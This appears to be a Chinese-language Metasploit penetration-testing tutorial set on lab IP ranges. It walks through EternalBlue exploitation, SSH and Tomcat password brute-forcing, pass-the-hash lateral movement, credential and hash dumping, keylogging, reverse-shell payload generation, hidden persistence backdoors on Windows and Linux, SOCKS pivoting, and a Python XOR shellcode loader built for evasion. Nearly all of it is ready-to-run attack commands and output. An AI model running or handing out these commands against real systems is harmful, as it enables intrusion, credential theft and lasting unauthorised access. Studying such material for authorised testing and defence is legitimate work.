## 场景一：MS17-010 永恒之蓝利用

### 目标
利用 MS17-010 永恒之蓝漏洞获取 Windows 主机的 SYSTEM 权限。

### 操作流程

**步骤一：漏洞检测**
```bash
# 方法一：Nmap 检测
nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.0/24

# 方法二：MSF 辅助模块检测
msfconsole -q

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# 输出示例：
# [+] 192.168.1.15:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
# [+] 192.168.1.25:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
```

**步骤二：漏洞利用**
```bash
# 使用永恒之蓝 exploit 模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.15
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444

# 可选：查看目标系统信息（选择合适的 target）
show targets
set target 0  # 自动检测

# 运行
run

# 成功后会获得 Meterpreter 会话
# [*] Sending stage (206403 bytes) to 192.168.1.15
# [*] Meterpreter session 1 opened (192.168.1.1:4444 -> 192.168.1.15:49158)
```

**步骤三：后渗透操作**
```bash
# 查看系统信息
meterpreter > sysinfo
# Computer        : WIN-7PC
# OS              : Windows 7 (6.1 Build 7601).
# Architecture    : x64
# System Language : zh_CN
# Domain          : WORKGROUP
# Logged On Users : 2

# 查看权限
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# 进程列表
meterpreter > ps

# 迁移到稳定进程
meterpreter > migrate -N explorer.exe
# 或迁移到 svchost.exe
meterpreter > migrate -N svchost.exe
```

**步骤四：凭证收集**
```bash
# 加载 Mimikatz
meterpreter > load kiwi

# 获取所有凭证
meterpreter > creds_all

# 导出 SAM 哈希
meterpreter > lsa_dump_sam

# 导出 LSA 秘密
meterpreter > lsa_dump_secrets

# 键盘记录（可选）
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

**步骤五：内网扩展**
```bash
# 查看网络配置
meterpreter > ipconfig
meterpreter > run get_local_subnets

# 后台运行，添加路由
meterpreter > background

msf6 > route add 10.0.0.0 255.255.255.0 1
msf6 > route print

# 内网扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set THREADS 20
run
```

## 场景二：SSH 弱口令爆破与利用

### 目标
通过 SSH 弱口令登录 Linux 服务器，获取 Shell 并进行后渗透。

### 操作流程

**步骤一：SSH 爆破**
```bash
# 使用 SSH 登录爆破模块
use auxiliary/scanner/ssh/ssh_login

# 设置参数
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/fasttrack.txt
set STOP_ON_SUCCESS true
set THREADS 5
set VERBOSE false

# 运行
run

# 输出示例：
# [+] 192.168.1.100:22 - Success: 'root:toor'
# [*] Command shell session 1 opened (192.168.1.1:4444 -> 192.168.1.100:22)
```

**步骤二：升级到 Meterpreter**
```bash
# 方法一：使用 sessions -u 升级
sessions -u 1

# 方法二：手动上传并执行
# 1. 生成 Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o backdoor.elf

# 2. 进入 shell 会话
sessions -i 1

# 3. 上传 payload
# （使用 scp 或在 shell 中 wget/curl 下载）

# 4. 本地启动 handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j

# 5. 执行 payload
chmod +x backdoor.elf
./backdoor.elf
```

**步骤三：后渗透操作**
```bash
# 系统信息
meterpreter > sysinfo
meterpreter > getuid

# 信息收集
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/hashdump

# 网络信息
meterpreter > ipconfig
meterpreter > route
meterpreter > run get_local_subnets

# 文件收集
meterpreter > ls /root
meterpreter > cat /etc/passwd
meterpreter > download /etc/shadow
```

**步骤四：Linux 提权**
```bash
# 查看系统版本和补丁
meterpreter > cat /etc/os-release
meterpreter > uname -a

# 搜索 Linux 提权模块
search type:exploit platform:linux local

# 常见提权：
# 脏牛（Dirty COW）
use exploit/linux/local/dirtycow
set SESSION 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run

# 检查可写的配置和脚本
meterpreter > run post/linux/gather/enum_configs
```

**步骤五：持久化**
```bash
# 方法一：Crontab 定时任务
meterpreter > shell
echo "*/30 * * * * /tmp/.systemd-update" >> /var/spool/cron/root
chmod +x /tmp/.systemd-update

# 方法二：Bashrc 后门
echo "/tmp/.backdoor" >> /root/.bashrc

# 方法三：SSH 公钥
# 把自己的公钥写入 ~/.ssh/authorized_keys
```

## 场景三：Web 应用漏洞利用到内网渗透

### 目标
通过 Tomcat 弱口令获取 WebShell，进而渗透内网。

### 操作流程

**步骤一：Tomcat 管理后台爆破**
```bash
# 爆破 Tomcat 管理后台
use auxiliary/scanner/http/tomcat_mgr_login

set RHOSTS 192.168.1.50
set RPORT 8080
set STOP_ON_SUCCESS true
set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
run

# 输出：
# [+] 192.168.1.50:8080 - Login Successful: tomcat:s3cret
```

**步骤二：部署 WAR 包获取 Shell**
```bash
# 使用 Tomcat 上传漏洞模块
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 192.168.1.50
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444

run

# 成功后获得 Java Shell 会话
```

**步骤三：升级到 Meterpreter**
```bash
# 生成 Java Meterpreter payload
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4445 -f raw -o java_shell.jar

# 启动 handler
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4445
run -j

# 在 WebShell 中下载并执行 payload
# （通过 curl/wget 下载，然后 java -jar 执行）
```

**步骤四：内网信息收集**
```bash
meterpreter > ifconfig
# 发现内网网段 10.0.0.0/24

meterpreter > run get_local_subnets
# Local subnets: 10.0.0.0/24, 192.168.1.0/24

# 添加路由
meterpreter > background
msf6 > route add 10.0.0.0 255.255.255.0 1
msf6 > route print
```

**步骤五：内网扫描**
```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,139,445,3306,3389,8080
set THREADS 20
run

# SMB 扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run

# MS17-010 检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.0.0.0/24
set THREADS 20
run
```

**步骤六：横向移动**
```bash
# 发现 Windows 主机后，尝试永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.15
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1  # 注意：LHOST 要是目标能访问到的 IP
set LPORT 4446
run

# 或者使用 Psexec 横向
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.20
set SMBUser administrator
set SMBPass P@ssw0rd
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4447
run
```

## 场景四：Pass-the-Hash 横向移动

### 目标
使用获取到的 NTLM 哈希进行哈希传递，横向移动到其他主机。

### 操作流程

**步骤一：获取哈希**
```bash
# 从第一台机器获取密码哈希
meterpreter > load kiwi
meterpreter > lsa_dump_sam

# 或使用 hashdump
meterpreter > run post/windows/gather/hashdump

# 获取到的哈希格式：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#                         ↑ LM 哈希                    ↑ NT 哈希
```

**步骤二：Psexec 哈希传递**
```bash
# 使用 psexec 模块进行哈希传递
use exploit/windows/smb/psexec

set RHOSTS 192.168.1.50
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444

run

# 说明：
# SMBPass 格式：LM_HASH:NT_HASH
# 如果不知道 LM 哈希，可以用 aad3b435b51404eeaad3b435b51404ee（空 LM 哈希）
```

**步骤三：WMI 哈希传递**
```bash
# 使用 WMI 进行横向移动（更隐蔽）
use exploit/windows/local/wmi

set RHOSTS 192.168.1.50
set SMBDomain WORKGROUP
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4445

run
```

**步骤四：WinRM 哈希传递**
```bash
# 使用 WinRM 横向移动
use exploit/windows/winrm/winrm_login

set RHOSTS 192.168.1.50
set USERNAME administrator
set PASSWORD aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set DOMAIN WORKGROUP

run
```

**步骤五：批量哈希传递**
```bash
# 先扫描所有开放 445 端口的主机
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445
set THREADS 50
run

# 对所有开放 445 的主机尝试 Psexec
# 使用 resource 脚本批量执行
```

## 场景七：持久化与后门

### 目标
在目标系统上安装持久化后门，维持长期访问。

### 操作流程（Windows）

**方法一：注册表持久化**
```bash
# 运行注册表持久化模块
run post/windows/manage/persistence_exe

# 或手动添加注册表
meterpreter > shell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "C:\Users\Public\update.exe" /f

# 也可以添加到当前用户
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Users\Public\update.exe" /f
```

**方法二：计划任务**
```bash
# 使用 schtask 模块
run post/windows/manage/schtask

# 或手动创建
meterpreter > shell
schtasks /create /tn "SystemUpdate" /tr "C:\Users\Public\update.exe" /sc minute /mo 30 /ru SYSTEM

# 每日执行
schtasks /create /tn "DailyUpdate" /tr "C:\Users\Public\update.exe" /sc daily /st 09:00 /ru SYSTEM
```

**方法三：服务安装**
```bash
# 创建服务
meterpreter > shell
sc create "System Update Service" binPath= "C:\Users\Public\update.exe" start= auto
sc start "System Update Service"

# 配置服务恢复
sc failure "System Update Service" reset= 0 actions= restart/1000
```

**方法四：WMI 事件订阅（隐蔽）**
```bash
# 使用 WMI 事件持久化模块
run post/windows/manage/wmi_event_filter

# 特点：
# - 隐蔽性高
# - 不易被发现
# - 管理员权限检查
```

**方法五：DLL 劫持**
```bash
# 使用 DLL 劫持模块
run post/windows/manage/dll_hijack

# 原理：
# - 找到加载顺序中可写的目录
# - 放置恶意 DLL
# - 程序启动时加载恶意 DLL
```

### 操作流程（Linux）

```bash
# 方法一：Crontab 定时任务
meterpreter > shell
echo "*/30 * * * * /tmp/.systemd-update" >> /var/spool/cron/root
chmod +x /tmp/.systemd-update

# 方法二：Bashrc 后门
echo "/tmp/.backdoor" >> /root/.bashrc
echo "/tmp/.backdoor" >> /home/user/.bashrc

# 方法三：SSH 公钥
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3Nza... attacker@kali" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# 方法四：SUID Shell
cp /bin/bash /tmp/.bash
chmod u+s /tmp/.bash
# 使用：/tmp/.bash -p

# 方法五：PAM 后门
# （复杂，需要编译 PAM 模块）
```

## 场景八：SOCKS 代理内网漫游

### 目标
通过 MSF 的 SOCKS 代理，将攻击机的工具代理到内网使用。

### 操作流程

**步骤一：获取内网会话**
```bash
# 假设已经通过 Web 漏洞获得了 DMZ 区服务器的 Shell
# 该服务器有双网卡，能访问内网
```

**步骤二：添加路由**
```bash
# 查看内网网段
meterpreter > run get_local_subnets
# 10.0.0.0/24, 172.16.0.0/16

# 后台运行
meterpreter > background

# 添加路由
msf6 > route add 10.0.0.0 255.255.255.0 1
msf6 > route add 172.16.0.0 255.255.0.0 1
msf6 > route print
```

**步骤三：启动 SOCKS 代理**
```bash
# 使用 socks_proxy 模块
use auxiliary/server/socks_proxy

set SRVHOST 0.0.0.0
set SRVPORT 1080
set VERSION 5

run -j

# 验证
jobs
# 应该看到 socks_proxy 任务在运行
```

**步骤四：配置工具使用代理**
```bash
# 方法一：Proxychains
# 安装 proxychains
apt install proxychains4

# 配置 /etc/proxychains4.conf
socks5 127.0.0.1 1080

# 使用 proxychains 运行工具
proxychains nmap -sT -Pn 10.0.0.10
proxychains curl http://10.0.0.20:8080
proxychains ssh user@10.0.0.30

# 方法二：浏览器代理
# 设置 SOCKS5 代理 127.0.0.1:1080
# 直接访问内网 Web 服务

# 方法三：其他工具
# sqlmap --proxy=socks5://127.0.0.1:1080
```

**方法四：自定义加载器**
```bash
# 1. 生成 raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f raw -o shellcode.bin

# 2. 编写自定义加载器（C/C++/C#/Python 等）
# 3. 加密/编码 shellcode
# 4. 运行时解密并执行

# 示例：Python 加载器
import ctypes
import sys

# 加密的 shellcode（XOR 等）
encrypted_shellcode = b'\x90\x90\x90...'
key = b'\xDE\xAD\xBE\xEF'

# 解密
shellcode = bytes([encrypted_shellcode[i] ^ key[i % len(key)] for i in range(len(encrypted_shellcode))])

# 分配可执行内存
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)

# 复制 shellcode
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))

# 创建线程执行
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

## 实战技巧总结

### 1. 渗透测试标准流程

```
1. 信息收集
   - 端口扫描、服务识别
   - 漏洞探测

2. 漏洞利用
   - 选择合适的 exploit
   - 获取初始访问权限

3. 权限提升
   - getsystem / 本地提权漏洞
   - 从用户到 SYSTEM/root

4. 凭证收集
   - Mimikatz 抓取密码
   - 浏览器密码、WiFi 密码等

5. 内网渗透
   - 添加路由、端口转发
   - 横向移动
   - 域渗透

6. 持久化
   - 安装后门
   - 清理痕迹

7. 报告
   - 整理漏洞信息
   - 编写渗透报告
```

### 2. 提权路径

```
普通用户权限
  ↓
Bypass UAC（如果是管理员组用户）
  ↓
管理员权限
  ↓
getsystem / 漏洞提权
  ↓
SYSTEM / root 权限
```
